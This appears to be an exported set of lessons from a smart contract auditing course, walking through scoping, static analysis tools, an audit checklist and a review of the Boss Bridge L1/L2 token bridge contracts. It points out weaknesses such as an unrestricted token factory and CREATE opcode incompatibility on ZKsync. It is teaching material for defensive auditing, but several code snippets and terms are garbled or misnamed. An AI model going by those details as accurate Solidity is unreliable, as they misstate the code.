          From our initial study, we gather that our contracts will deploy to the Ethereum Mainnet. Interestingly, we're deploying a new entity, `tokenfactory.sol`, for the first time to ZKsync era.

          ![](https://cdn.videotap.com/SYHd0AD9SPTDOeE3c8j6-148.78.png)

          You will notice several roles or 'actors', one of which has the authority to pause and unpause the bridge in event of an emergency - a common design pattern known as the Emergency Stop pattern.

          ## Acknowledging known issues

          From the outset, it's evident that there's an element of centralization with the project. This sort of authority vested with an individual or a single entity has its own pros and cons. On one hand, it's beneficial for effective and quick resolution of discrepancies. On the other, it tends to undermine the fundamental principle of blockchain's decentralization. However, such centrality aspects could be disregarded in a competitive audit.

          Upon further review, we notice that zero-address checking seems to be intentionally disabled, presumably to save gas. Also, there are some magic numbers that, instead of being recognized as constants, have been distinguished as literals.

          Despite these hiccups, it's clear that the protocol has a decent understanding of 'weird ERC20s'. They've incorporated `make slither` and `make aderyn` into the codebase as tools, key signs of protocol's awareness towards security.

          ## Checking Code Coverage

          To get an idea of the code coverage, we need to install the necessary libraries and run `forge coverage`. While our coverage might not be exhaustive, it could be considerably better. The `tokenfactory` is fully covered. However, the `vault` entity misses out entirely, which might result in several attack vectors.

          ![](https://cdn.videotap.com/gS0LrDyx1XBys7mxdaUB-240.33.png)

          In such scenarios, stateful fuzzing test suites could compensate for the shortcoming in manual reviews. At the moment, this approach is increasingly becoming a standard requirement for security.

          ## Running Solidity Metrics

          Finally, as part of your project scope, remember to run a couple of tools ‚Äì even if it blurs into vulnerability identification. This instance of the project has a complexity score of 106 and 101 lines of code ‚Äì nearly half the size of the Thunder Loan project, which makes it quite simple to work through.

          With this comprehensive understanding of the README and documentation, it's time to start your reconnaissance. From here on, with the context you've gained from the project scope, you're ready to probe further and uncover potential vulnerabilities and exploits.

          Happy auditing!
        description: 'Learn about scoping, coverage reports, understanding roles, thorough documentation, code coverage, stateful fuzzing tests, and invariant testing.'
      -
        id: 846a626f-c44a-4167-9988-cdaedce16969
        type: new_lesson
        enabled: true
        title: 'Phase 2: Recon'
        slug: recon
        duration: 2
        video_url: ivB900sX48JF7N02aUvOS01U7Lg1LnDddOWYfHTeVGDGlI
        raw_markdown_url: /routes/security/7-bridges/3-recon/+page.md
        markdown_content: |-
          ---
          title: Recon
          ---



          ---

          # Static Analysis of Ethereum Smart Contracts

          One of the first steps in smart contract auditing involves the use of static analysis tools. These tools can scan your codebase and identify potential issues such as vulnerabilities, bugs, or deviations from best practices. This blog post will provide a detailed walkthrough of static analysis, using `make slither` and `make aderyn` commands as primary examples of tools that we can use.

          ## Reading The Documentation

          The first step on this journey of static analysis will always be reading the documentation of the tool that you want to use. Why is this? Because it will help you understand the full capabilities of these tools. Despite this, the documentation step is often overlooked, so do remember to pay special attention to it.

          Today, however, after a quick glance over the user manual, I am eager to dive straight into the codebase. Brace yourself for some adventurous code auditing!

          ## Running Static Analysis Tools

          In this scenario, I've decided to start by running my static analysis tools.

          ![](https://cdn.videotap.com/WV5JlvHe6ylxiE7aFko2-12.35.png)

          The command to initiate the process is `make slither`. This should be run as a baseline test for any codebase under scrutiny. As devs, it's our responsibility to ensure a codebase complies with best practices.
          ...
          It turns out the codebase is riddled with issues. But no worries ‚Äì this is what we signed up for. Let‚Äôs dive deeply into these issues shortly.

          Next, it's time to run the `make aderyn` command to get a secondary report:

          ## Analyzing the Report

          Now we have the `report.md` ready. Time to examine its findings.

          ![](https://cdn.videotap.com/l0Mt9wevI06wPhE5FmZS-38.8.png)

          A sneak peek into the report reveals some medium-grade issues. Let's examine them closely:

          - **Centralized Risk** - The contract has a centralized risk problem. Despite the fact that blockchain was built on the pillars of decentralization, many developers fall into the trap of creating contracts that rely on central authority.
          - **Unsafe ERC20 operations** - The contract uses unsafe ERC20 operations. This is a big no-no.

          > "ERC20 operations should not be used. The return values are not always meaningful. It is recommended to use [OpenZeppelin's SafeERC20 library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol)".

          - **Missing zero address checks** - The contract does not have zero address checks.
          - **Functions could be marked external** - There are functions which are not used internally, these could be marked external which could save some gas.
          - **Undefined constants** - The contract uses magic numbers instead of defined constants.
          - **Incorrect events** - Events in the contract are not defined correctly.

          The report from Aderyn is full of useful insights. They will all be copied and pasted into their rightful sections in the final report.

          ## Reconnaissance

          Finally, it's time for reconnaissance. I pondered over whether to do the `Tincho`, which analyzes the contracts from the least to the most complex. Since there are only four contracts, I opted to forgo creating a new sheet for documentation.

          Stay tuned for further posts to unveil the specifics of each of these issues, and the steps taken to mitigate them.
        description: 'Code Review - Static Analysis Tools & Fixing Issues. Patrick leverages Slither and Aderyn to dive into Boss Bridge.'
      -
        id: 79941ec5-6897-46fd-a326-69e439282e2c
        type: new_lesson
        enabled: true
        title: Checklist
        slug: checklist
        duration: 4
        video_url: x5BUf3muNj01dX5CBkhrVcXFhl0236gYCgzGfX2uNr7xA
        raw_markdown_url: /routes/security/7-bridges/4-checklist/+page.md
        markdown_content: |-
          ---
          title: Checklist
          ---



          ---

          # The Ultimate Auditor‚Äôs Checklist Method: The Hans

          Have you ever wondered about the techniques that a talented and successful auditor uses (like the No.1 Web3 auditor, Hans), to keep everything organized? Well, wonder no more. Today, we are going to discuss an important tool Hans uses, a highly comprehensive checklist that we will explore here. The information might astonish you, so now is the time to buckle up for an Audit Adventure.

          ![](https://cdn.videotap.com/tXeWNgj1dZEkapH1ksfB-13.48.png)

          ## The Power of a Checklist

          The power of a checklist lies in the precision it can bring to a potentially massive process. By breaking down what might otherwise feel like a daunting task into structured and doable segments, checklists allow us to tread with confidence. Entertainment tech giant GitHub has embraced this approach by maintaining a repository-driven checklist entitled "audit checklist" for performing code audits.

          > The checklist is part of an extensive repertoire of different attacks complete with links to Solidit, where these attacks have been reported, their implications and much more. Initially, it is in the JSON format, but will soon be hosted on Solidit for an enhanced user-friendly experience.

          You can view and utilize this effective tool [here](https://github.com/Cyfrin/audit-checklist).

          ![](https://cdn.videotap.com/Os7tDGbFK1OTvjjccMdx-60.68.png)

          ## Diving into the Checklist

          The checklist dives instinctively into an attacker's mindset and focuses on a list of general checks for common attack types. Each section is meticulously designed to guide you through the audit process, complete with descriptions, remedial advice, references to potential attacks, and tags.

          For instance, a section on "Reentrancy Attacks" includes questions you might ask to verify a system is safe from this category of assault. Questions like: "Are there any state changes after interaction with an external contract?" guide the process strategically.

          The checklist covers other types of attacks, such as:

          - Denial-of-Service
          - Griefing Attacks
          - Replay Attacks

          The FAQ format ensures you‚Äôre doing your due diligence when evaluating a protocol. For example, under denial of service, you could inquire "Is the withdrawal pattern followed to prevent denial of service?" or scrutinize how the protocol manages tokens with blacklisting functionality ‚Äì a point we have touched on before.

          ## Making It Your Own

          Optimizing this checklist to suit your needs will help you make the most of it. You can do this by visiting the [Cyfrin GitHub audit checklist](https://github.com/Cyfrin/audit-checklist) and tweaking the JSON format to suit your preferences. The inclusion of your ideas not only makes the checklist more usable but also contributes to the creation of a collective knowledge base that benefits everyone.

          ![](https://cdn.videotap.com/ndm5LlDWEj2Gnsr6ADqz-148.32.png)

          ## Going Beyond the Given

          The nature of our industry means the checklist isn‚Äôt definitive. New issues and challenges come up that might not be covered by the current framework.

          Therefore, this checklist remains a living document, one which requires continuous updating and refining. This could mean adding new issues to your list or making a pull request to include new questions that arise during the audit process.

          ## Conclusion

          So there it is, the Auditor's Checklist Method by Hans. The roadmap to auditing a project, checking off every potential security vulnerability, ensuring that the protocol follows best practices.

          Remember, the best use of this checklist comes not only from following it but also in reflecting upon its points and amalgamating your insights into it.

          Happy auditing!

          ![](https://cdn.videotap.com/B8DVGbPuHxUALaBDmvYC-202.26.png)
        description: "Patrick details the 'Hans' approach to security reviews and leveraging Hans' Audit Checklist (available on Solodit)."
      -
        id: 925e54df-38a4-466f-8c04-b7cabf3f39ce
        type: new_lesson
        enabled: true
        title: Docs
        slug: Docs
        duration: 2
        video_url: mq7UPZlyX1LE9euvtNg5ngqlXrbeIDpTrenEiqU0097I
        raw_markdown_url: /routes/security/7-bridges/5-Docs/+page.md
        markdown_content: |-
          ---
          title: Docs
          ---

          ## 

          # Bridging the Gap: Introducing Boss Bridge for ERC20 Tokens

          ![](https://cdn.videotap.com/7JrqjCcxUyOafjUdWM9V-11.74.png)

          ## How Does Boss Bridge Work?

          In essence, the key function of our Boss Bridge is providing a pathway for users to deposit their tokens. Upon deposit, these tokens are stored securely in an L1 digital vault. The deposit event triggers a subsequent off-chain event which our mechanism discerningly picks up, parses it, and then mints the corresponding amount in L2.

          > Remember: The main goal here is ensuring user safety and security.

          The first version of the bridge adheres strictly to this ideal and includes several security features.

          ## Key Security Features

          The current version of our Boss Bridge boasts multiple mechanisms aimed at enhancing the security of deposited tokens:

          1. The bridge owner has full authority to pause any operations during emergent situations.
          2. Account deposits are permissionless, but to avoid any potential abuse, we have imposed a strict limit on the number of tokens that can be deposited.
          3. All withdrawal requests must be approved by the bridge owner.

          We are focused on continually improving this system, making it even safer and more secure with each update.

          ![](https://cdn.videotap.com/DSoIzu6Rtt37d8MackPQ-55.77.png)

          ## The Launch

          We are preparing to launch our L1 Boss Bridge on both the Ethereum Mainnet and ZK Sync platforms. Initially, we will use only L1 tokens, or their duplicates, within the bridge system.

          **Please note**: At this early stage, other ERC20 tokens will not be supported, and their 'weirdness' is considered out of scope on withdrawals.

          ## Withdrawal Process

          In the context of withdrawals, the bridge operator holds the responsibility of signing each withdrawal request submitted by users. These requests are made on the L2 component of the bridge.

          Essential point to mention: For a successful withdrawal, our service will check that the account submitting a withdrawal previously initiated a successful deposit on the L1 part of the bridge.

          ![](https://cdn.videotap.com/oRDUILrsz7wMudIoZwVx-76.32.png)

          ## Making Sense of the Boss Bridge

          If this seems a bit overwhelming, it is natural. This is where you might be getting the urge to delve into the protocol design, or you might want to explore the contract and draw up some diagrams on your own.

          In either case, these are healthy steps toward understanding the mechanism better. For those willing to roll up their sleeves and create some diagrams, we encourage you to pause right here, grab your notebook, and start sketching. It's a great learning experience!
        description: 'The audit begins with assessing the documentation and gaining context of the Boss Bridge protocol!'
      -
        id: 5328d856-613d-444a-9ecd-2a5955ae342e
        type: new_lesson
        enabled: true
        title: 'Boss Bridge Diagram'
        slug: boss-bridge-diagram
        duration: 6
        video_url: ofSZi6DuGeL01HATXfvtjSBttM5Rejb9ABM38GJhi01hA
        raw_markdown_url: /routes/security/7-bridges/6-boss-bridge-diagram/+page.md
        markdown_content: |-
          ---
          title: Boss Bridge Diagram
          ---



          ---

          # Understanding Bridges in Ethereum and ZK Sync with Audit Data

          Hello, everyone! If you've been scrolling through the audit data section of our Git repo, you might have noticed a sketch of the L1-L2 Bridge structure used for transactions, meant to illustrate contract creation and token execution. Let's go through it together!

          ## The Bridge Structure

          ![](https://cdn.videotap.com/rIxjCdQQCX2uJutT8w6U-12.43.png)

          As you can see from the image, on the left of this dotted line, we have contracts on the Layer One (L1), while on the right side you can see the contracts yet to be built -- for now, they are only imaginary. They will exist in the future on Layer Two (L2).

          The L1 is where we focus most of our attention. Why? Because this is where we have the Tokenfactory.sol - a pivotal contract whose sole function is to deploy L1 tokens.

          ### The Role of the Tokenfactory

          The `tokenfactory.sol` is a simple and minimal contract. It's ownable, comes with mappings, and you'll notice it has just one function - `deployToken`. This function deploys a new ERC20 token contract, accepting the contract bytecode as input.

          ```js
          function deployToken(bytes memory bytecode) public onlyOwner returns (address){
              return _deploy(bytecode);
              }
          ```

          Though it is noteworthy that deploying any contract can be hazardous, we'll assume that the `tokenfactory.sol` will correctly hold a copy of the L1 token contract bytecode and not any malicious ERC20.

          > - _"We should note that you can potentially deploy anything with `deployToken()`, which isn't ideal."_

          Yes, as unsettling as it might sound, this token factory could technically deploy any contract. But bear in mind, this is an accepted caveat that was already addressed in the known issues section of the documentation. We will not dwell much on this, as it is within the scope of the project, and any other issue arising would fall out of scope.

          ### L1 Token - The Bridge

          Moving on, we have the `L1Token.sol`. This is a very minimal L1 token with a max supply named Boss Bridge Token (BBT). Its sole purpose is to journey between the L1 and the L2. For instance, your L1 could be something like ETH, and the L2 might be ZKSync, or vice-versa.

          ![](https://cdn.videotap.com/j1ojbfHNdYgSRmp6YI6u-111.91.png)

          It is important to note that L1 entities will be present on both Ethereum and ZKSync irrespective of the labeling.

          Then we have the main contract known as `L1BossBridge.sol`, responsible for facilitating the core operations of the system.

          ### L1BossBridge - The Main Contract

          The `L1BossBridge.sol` contract has a substantial role and a few capabilities. It can pause and unpause, illustrating some centralized power. Most crucially, it permits users to deposit tokens to L2 and withdraw tokens from the L2 back to the L1.

          ```js
          function sendToL2(address _l2Delegate, address _token, uint256 _amount, uint256 _l2Gas, bytes calldata _data) external whenNotPaused returns (bytes memory){
              /* (...rest of code...)*/
          }
          ```

          The `sendToL2()` function deposits token to L2. Once tokens are sent, they are locked into `L1Vault.sol`. This vault is relatively simple and doesn't really do much other than holding onto the L1 tokens approved by the Boss Bridge.

          ### How Tokens Travel Between Layers

          When the Boss Bridge signals, the vault releases the tokens. This mechanism allows tokens to be sent from an L1 to an L2. In practice, if we send 10 tokens into the vault from the L1, these 10 tokens locked into the L1 vault aren't directly transferred to the L2.

          Instead, they are locked in another vault on the L2 side, triggering the system to release an equivalent number of tokens (in this case, 10) on the L2. This process of locking and releasing is observed and controlled by a centralized off-chain service.

          To keep this a touch simpler and less technical, bridges usually work this way. You don't transmit tokens directly over the L1. Instead, you lock them into a vault, and the L2 produces an identical version of the token for you to use.

          The final piece of this process involves tokens on L2 being relocked into the L2 vault. These Signers, the centralized units noteworthy for their crucial role, will approve the tokens to be unlocked on L1 again.

          ```js
          function unlockL1(address _l2Delegate, address _token, uint256 _amount, bytes calldata _data) external whenNotPaused returns (bytes memory){
              /* (...rest of code...)*/
              }
          ```

          ### The Key Role of Signers

          So these Signers are important because they see who's depositing to either layer and decide when to unlock or relock tokens. As valuable as this function is, it is also an embedded known issue with the protocol due to its centralized nature.

          Once a token in L1 gets locked in the vault, it's liberated to roam in L2. Reversibly, when you lock it back into the L2 vault, Signers get a signal, and the tokens from L1 vault are released.

          I hope this makes sense. I hope this helps you understand how the bridge between layers work. If you have any further questions, feel free to drop a comment, and I'll be happy to help!
        description: 'In this lesson we visualize the transaction flow of Boss Bridge using protocol diagrams.'
      -
        id: 46830858-6899-4cd0-92df-d010c0f5e01c
        type: new_lesson
        enabled: true
        title: L1Token.sol
        slug: l1-token
        duration: 2
        video_url: 00WrYIi3u4Z9LIA2sDFwZwl89mDkOh01B2Hy27VGy1gVQ
        raw_markdown_url: /routes/security/7-bridges/7-l1-token/+page.md
        markdown_content: |-
          ---
          title: L1Token.sol
          ---



          ---

          # Diving Deep into the Trenches with Solidity Code

          Today, we are armed with an abundance of context, which provides us with a fortified understanding of what this code base embodies. Let's begin!

          ## Invoking the "Tincho"

          ![](https://cdn.videotap.com/KbfZIIwRu0i6v3I4hHUH-9.1.png)

          We're going to invoke the Tincho method in our exploration - starting with the little ones and progressively getting bigger, like a well-ascended staircase of understanding. And don't worry, we'll make sure to go through a checklist at the end to ensure we've covered all bases.

          ## Descending to the Code Depths

          Our first stop? The smallest code base in our array of documents. Hop onboard, as we open up the file for `Solidity metrics` and navigate towards the seemingly insignificant number seven, `L1Token.sol`. A little intimidating, isn‚Äôt it? But fear not, we‚Äôre just about to dive deep and decipher this "Bad Larry".

          ## Finding the Unexpected in the Expected

          Upon inspecting `L1Token.sol`, we find quite a regular landscape - not particularly striking with nothing out of the ordinary. But let's not rush our judgment.

          We're leveraging codes from `OpenZeppelin`. As veterans in this field, we‚Äôre well acquainted with `OpenZeppelin`.

          ```js
          private constant initial_supply;
          ```

          Prima facie, we encounter a private constant initial supply which seems appropriately allocated. It's multiplied by the decimal representation of ten - a magic number by a certain perspective but just a ten, hence, no alarm bells ringing.

          ## Unravelling the Tests

          Diving deeper, we look for a deploy. Unfortunately, this section seems to be lacking a dedicated deployment component in its structure. There's a `token factory test`, but the sight of `L1Token` tests is scarce.

          But wait, there's a silver lining! There are indeed a few tests conducted on the `L1Token`. For instance, we have a token transfer test.

          This token is utilised in the transfer process, and it seems to deploy a brand-new token. Once again, nothing screams out of place - everything seems quite standard here.

          ## Final Words

          After scrutinizing `L1Token.sol`, it appears quite compliant with standard solidity coding practices. Following the Tincho approach has led us to meticulously dissect this small piece of code, to such an extent, that we can confidently say - "this looks fine".

          Continuing on this journey, we will employ the same procedure to the next segment of the code. Embark on this journey with us as we delve into the eccentric and challenging world of software development, one line of code at a time.

          > "The job of the coder is not just to code. It is to understand and then code." - Anonymous Developer
        description: 'A brief run through a fairly standard token contract contained in Boss Bridge.'
      -
        id: 5ac83da6-7426-4962-99c5-4bf246942eff
        type: new_lesson
        enabled: true
        title: L1Vault.sol
        slug: vault-sol
        duration: 4
        video_url: J02cZ02Livh01JhXcYvw00hREKQILG00Qot4NRmW3Rj8m7To
        raw_markdown_url: /routes/security/7-bridges/8-vault/+page.md
        markdown_content: |-
          ---
          title: Vault.sol
          ---



          ---

          # Dive into the L1 Vault of TokenBridge

          In this post, we're going to explore the innards of the Layer 1 (L1) vault, a critical part of the TokenBridge, a network built for token transfers between different blockchain networks.

          ## The Role of the L1 Vault

          To kick things off, the L1 Vault is essentially a storage box for tokens. It holds tokens when they're not being used or transferred on either L1 or Layer 2 (L2) networks. When needed, these tokens can be unlocked to "frolic and play" on the L1 or L2 playgrounds.

          ![](https://cdn.videotap.com/SPq2DMS4BIdTLOfpIdi6-22.67.png)

          Let's dive deeper into the vault itself.

          ## An Introduction to L1 Vault Structure

          The L1 Vault, as expected, is slightly larger in size but not too big to handle. The vault is 'ownable', meaning it can have designated owners - this could be an individual, a group, or another contract.

          There's a descriptor (NatSpec) on top that indicates the author's identity - Boss Bridge. According to the NatSpec, the contract has two primary responsibilities: locking and unlocking tokens on the L1 or L2, and giving the green light to a bridge so it can move funds to and from this contract.

          The owner of this contract, the note says, should ideally be a bridge.

          And this sparks off our first question: can we somehow tweak it so that the owner is not the bridge?

          ## Deployment of the L1 Vault

          However, the folks at TokenBridge seem to be missing a deploy folder, which is definitely something worth mentioning. How would you deploy your contract without a deploys directory? This could certainly improve.

          We then dig further into how they launch the vault. They've got an initiation sequence where the vault is equated to 'tokenbridge.vault‚Äô, which seems to suggest that the Boss bridge itself is deploying the vault.

          Taking a closer look at the L1 Boss Bridge, this assumption is confirmed - the 'vault' is a public, immutable value. It is set to be the 'vault' address during the deployment process, which means there is likely no failure-to-initialize issue here.

          ## Understanding Ownership in the Contract

          Next, we come across the apparent fact that the L1 bridge is ownable. This isn't surprising. A constructor prepares an IERC20 token (a standard interface for tokens within smart contracts). It's worth noting that each vault seems to be working with one token and one bridge.

          The constructor of the contract appears perfectly reasonable. The 'ownable' entity will be message.sender (which will be the Boss bridge). The core purpose of the `approveTo` function seems to be that the bridge is authorized to move funds in and out of the vault.

          However, one detail stands out - the approval isn't hardcoded to the bridge, but can potentially be granted to anything, which could pose a security risk.

          ```js
              function ApproveTwo(address _target, uint256 _amount) external onlyOwner {
                  Token.approve(_target, _amount);
                  }
          ```

          These are some initial observations and insights on the L1 vault in the TokenBridge contract. Despite some minor concerns and potential areas for improvement, the contract seems to be well structured and efficient. Up next: exploring Solidity metrics and how they affect the contract.

          > "Each vault works with one token. That's good to know."
        description: 'Patrick scopes out L1Vault.sol for potential security vulnerabilities.'
      -
        id: a7b76821-b434-4f46-ad93-ae8be1a72ed8
        type: new_lesson
        enabled: true
        title: 'Yul Opcodes'
        slug: yul-opcodes
        duration: 2
        video_url: FTQ6is6V13NrQI623zRmb5GF1EkYtqHQRLsjdX6x1EA
        raw_markdown_url: /routes/security/7-bridges/9-yul-opcodes/+page.md
        markdown_content: |-
          ---
          title: Yul & Opcodes Introduction
          ---



          ---

          # How to Inspect Solidity's Token Factory

          Hey there! Ready to check out some code today? Awesome, let's do this. I hope you're as excited as I am. Let's first check our vault. Looking good! Our token also seems perfectly fine. Now, what‚Äôs next?

          ## Token Factory Complexity Score

          The next on our list is something with a complexity score of 23. It's the intriguing Solidity contract called `TokenFactory`. Referring to the title, the `TokenFactory` is designed to allow the owner to deploy new ERC20 contracts.

          For clarification, a complexity score is a numerical value that represents the complexity of code. The higher the score, the more complex the code is. It‚Äôs a great tool for identifying areas in your software that could benefit from refactoring to simplify the code and make it easier to maintain.

          `TokenFactory` is intended to be deployed on both an L1 and L2 Ethereum layer. Sounds interesting, right?

          Let's dive deeper into this 'Token Factory' contract.

          ![](https://cdn.videotap.com/N7h8lDL4ZkNHmMUJm92I-16.6.png)

          ## Analyzing The Token Factory Contract

          According to the documentation, the `TokenFactory` allows you to deploy a new ERC20 contract by passing it a symbol and the byte code of the new token. The symbol and byte code represent the identity of the new token that we want to deploy.

          A portion of the code that specifically interests me is the assumption that this is going to be an L1 token byte code. Just the thought of this seems a tad scary.

          One question pops in my head: "Did they even test this assumption anywhere?"

          ![](https://cdn.videotap.com/SXAsB2ew8qmWRUaZnRI6-37.94.png)

          ## Checking The Test Method

          Ah! They did. I see that there is a `TokenFactory` test. Now, it‚Äôs critical to remember that we are assuming the test is accurate. Although tests can contain errors too, they give us a good sense of how the software behaves under certain conditions.

          While the complexity score was discomforting and the code adherence was quite scary to me, the presence of this test somehow eases the discomfort.

          However, there's a "Q" marked on the code here which means "Query". It marks a place where the reader has questions or doubts about the code. In this case, it might be fine, but it begs the question - "Should this query be left out of scope?"

          To be blunt, there just seems to be some risky business here.

          ## An Auditor‚Äôs Perspective

          ‚ÄúAre you sure you should leave this out of scope?‚Äù, I find myself asking. Even though the guidelines say it's okay to exclude this in a competitive audit, in a private audit, I would still strongly recommend addressing this.

          > "You should really secure this code. There might be better ways to implement it."

          Remember, it's always crucial to double-check everything in your code, especially when it comes to security. Don't take things at face value.

          One of the points that catch my attention is that it doesn't seem efficient. The byte code is stored in memory rather than in call data, which is less gas efficient. Maybe it would be better to refactor the token factory.

          ![](https://cdn.videotap.com/DwK3ACMPJE6lTsWulD7x-71.14.png)

          ## Final Thoughts

          Does it all seem a bit scary? Absolutely. But keep in mind that it could also be an excellent opportunity to improve the code. The best code isn't always the most complex one, but the most secure and efficient.

          The challenging but fun part is figuring out the best way to do this. It‚Äôs a never-ending journey of learning and discovery. So, let's learn and discover together!

          Happy coding!
        description: 'Approaching low level code during a protocol audits.'
      -
        id: 736a476f-8947-4e49-b381-5335079ac4c7
        type: new_lesson
        enabled: true
        title: 'Unsupported Opcodes'
        slug: unsupported-opcodes
        duration: 11
        video_url: Olg01CRyrYZLhJCbyG4KBn9VIo6zvyswwLiSazYbVJxw
        raw_markdown_url: /routes/security/7-bridges/10-unsupported-opcodes/+page.md
        markdown_content: |-
          ---
          title: Exploit - Unsupported Opcodes
          ---



          ---

          # Deep Dive into Assembly Blocks in Solidity

          Welcome to another exciting episode in our exploration of Solidity! Today, we're going to be deep-diving into an intriguing aspect of Solidity: Assembly Blocks. So get your coding gloves on and let's start this journey!

          ## The Assembly Block: An Introduction

          Assembly blocks in Solidity offer us lower access level to the Ethereum Virtual Machine (EVM). Though not super low-level as there exists some level of abstraction in assembly (also known as Yul), assembly blocks provide a closer approach to working with EVM opcodes.

          ![](https://cdn.videotap.com/kygHboewjVz29gEvJnFB-57.14.png)

          > "Assembly in Solidity allows us closer access to the EVM, letting us perform opcodes that could potentially be unsafe."

          In the course of this blog, we will be examining the use case of the `Create` opcode in assembly. The `Create` opcode in Yul can be researched further in the [Solidity documentation](https://docs.soliditylang.org/en/v0.8.9/yul.html).

          ## Diving Into the Code: Exploring `Create` Opcode

          On executing the `Create` opcode, it consumes a value of VPN. To understand the essence of VPN, we actually have to examine the columns at the beginning of the documentation. The explanation column reveals that our `Create` opcode will form a new contract with the specified code and consequently dispatch `Vwei` and return the fresh address. In the event that an error occurs, it returns zero.

          Let's now delve more into the assembly block where this opcode is being used. Within this block, the opcode is saying that the contract bytecode. Secondly, it will load the contract bytecode into memory and then proceed to instantiate a contract.

          In programming using Solidity within the EVM, it's commonplace that almost any time you undertake something with contract deployment or variables or even literary reading, it's always necessary to load it into memory first.

          ## The Nitty-Gritty Details: Loading into Memory

          So how do we go about loading into memory? Fundamentally, you have to specify how much memory to load, from where, and to where. And anytime you're dealing with memory, you have to be very precise about your details.

          ![](https://cdn.videotap.com/bZJqzJb0Ba8wN3UXX2mL-214.29.png)

          In light of the specifications, it's safe to say that the first chunk of assembly we encounter returns an address. The purpose of the whole block is to create a contract and return the corresponding address.

          ## The TokenFactory: Its Role and Significance

          Delving further, we discover that the token factory keeps track of all tokens it broadcasts. It also emits a token upon being deployed‚Äîan interesting feature! A function, `getTokenAddressFromSymbol`, is also present, but it doesn't seem to be used anywhere within the rest of the code.

          ```js
          function getTokenAddressFromSymbol(string memory _symbol) public view returns (address){
              return s_TokenToAddress[_symbol];
              }
          ```

          Considering its lack of usage, this function could have likely been more effectively designated as external rather than public.

          ## Launching a Check on the Opcode: The Checklist Approach

          And now we arrive at an essential checkpoint: the opcode checklist. By utilizing this checklist, one can discover fascinating things about the opcode. A surprisingly interesting question you might find is whether the `push0` Opcode is supported for Solidity versions above `0.8.20`.

          Another question that pops up is the compatibility of EVM Opcodes and the protocol's operations across all target chains. It brings to mind the compatibility of the `Create` opcode with all our working chains.

          ![](https://cdn.videotap.com/aypb7Nern5qzvXGaDMLH-385.71.png)

          To unravel this puzzle, a practical step is to utilize the Solidity compiler, Solk, and see what we get after building the contracts and inspecting them. Sure enough, upon exploring the contracts, we will find the `Create` Opcode, which confirms its presence.

          ## Checking Compatibility Levels: The Ethereum Mainnet and Zksync

          As we've identified the opcode, we have to be sure about its compatibility with our working chains. Ethereum's mainnet is an assured pass, but what about Zksync?

          A quick dive into the [`Zksync documentation`](https://zksync.io/) clarifies things a lot. They have a comprehensive FAQ segment that explicates the difference between being 'EVM Compatible' and 'EVM Equivalent'.

          > "EVM Equivalent means a given protocol supports every Opcode of the Ethereum EVM down to the bytecode. EVM Compatible means a percentage of the Ethereum EVM's Opcodes are supported."

          Zksync is optimized to be EVM compatible and not EVM equivalent for a variety of reasons. However, this doesn't clarify the compatibility of the `Create` OpCode.

          Delving deeper, it becomes apparent that the EVM constructions `Create` and `Create2` on Zksync only work when the compiler is aware of the contract's bytecode beforehand. If the contract isn't aware of the bytecode prior to deployment, it will fail. This approach is strikingly similar to our example code‚Äîconfirming its potential failure on Zksync.

          ## Concluding Remarks: The Importance of Compatibility Checks

          This discovery underscores the importance of thorough opcode compatibility checks across all working chains. In fact, there was a well-documented instance of 921 ETH being stuck in a Zksync contract because the transfer function failed.

          Just a little foresight to check compatibility would have saved this massive loss! This real-life scenario serves as a solemn reminder of how vital it is always to consider EVM compatibility in our code implementations.

          In conclusion, whenever you embark on security reviews or contract deployments, always remember to refer to your safety checklist. Going through such a checklist not only helps you find hidden oddities but also ensures you're on the safer side of things.

          In all, remember that the devil is in the details. Happy programming!
        description: 'Learn about the importance of checking compatibility before deploying contracts across different L2s and chains.'
      -
        id: 4b7147fc-142c-4dfc-9f3b-891516b97a0e
        type: new_lesson
        enabled: true
        title: L1BossBridge.sol
        slug: bossbridge
        duration: 3
        video_url: AxU02OpN3bg4XyqKb6CCFmU5OC7BDkz00bffaN7UwPoR8
        raw_markdown_url: /routes/security/7-bridges/11-bossbridge/+page.md
        markdown_content: |-
          ---
          title: BossBridge.sol
          ---



          ---

          # Analyzing and Making Sense of the Boss Bridge

          Welcome to another deep dive into the world of blockchain code! Amidst our adventures, we stumbled upon a complex and intriguing beast known as the Boss Bridge. Now it's time to give it a thorough examination. So, let's grab our diving gear, get comfortable and leap straight into the code!

          ## A Brief Introduction

          The Boss Bridge doesn't have a lot of code, but don't let that mislead you. It's petite stature hides a heart of complex code. We'll deconstruct it piece by piece, so by the end, you're familiar with each line and what it does.

          ## Code Inspection: Pragma and Imports

          First off, the top of our file is home to a list of imports and a `pragma solidity` statement, versioned at 0.8.20. That seems up-to-date, which is a good start!

          ```js
          pragma solidity 0.8.20;
          ```

          Moving on to the imports, we have OpenZeppelin taking up a good portion of the space. As a tried and tested library thoroughly reviewed for security, it's always reassuring to see it.

          Next, we have a couple of new imports; namely the `ReentrancyGuard`, `Message`, `HashUtils`, and `ECDSA`. These might not be as familiar as OpenZeppelin, but they're equally important. Here's a closer look at a couple of them.

          ## Reinforcing the Code with ReentrancyGuard and Understanding Pausable

          _Disclaimer:_ This is where it's about to get technical.

          ### Pausable

          First up is `Pausable`. As the name suggests, it allows the addition of an emergency stop mechanism to your contracts.

          ```js
          import "@openzeppelin/contracts/security/Pausable.sol";
          ```

          It provides modifiers like `whenNotPaused` and `whenPaused` along with `pause` and `unpause` functions.

          The intriguing part is that certain functionality works only when `whenNotPaused` is in effect. Like any responsible coder, I checked whether there's a way to pause the contract by running forge.

          Good news: We do have a pause function in here!

          ### ReentrancyGuard

          Next, let's take on `ReentrancyGuard`. It's a fabulous guard against reentrancy attacks.

          ```js
          import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
          ```

          Through the use of a clever system it calls "mutex locks," it ensures that your functions stay clear of reentrancy mischief. It does this by using `nonReentrant`, `nonReentrantBefore`, and `nonReentrantAfter` modifiers.

          Essentially, it places a lock onto your function, ensuring that there are no repeated entries during its execution, which could lead to reentrancy attacks.

          In our `BossBridge` contract, the `sendToL1` function is guarded by `nonReentrant`, keeping it safe from potential threats.

          ## Conclusion

          We made some solid discoveries in our examination of the Boss Bridge's code. We managed to identify important aspects such as the use of the `Pausable` and `ReentrancyGuard` components, as well as confirmed the availability of the `pause` function.

          Keep coding and exploring, blockchain adventurers! I'll join you in the next deep-dive session.

          > _"Any fool can write code that a computer can understand. Good programmers write code that humans can understand."_ - Martin Fowler.
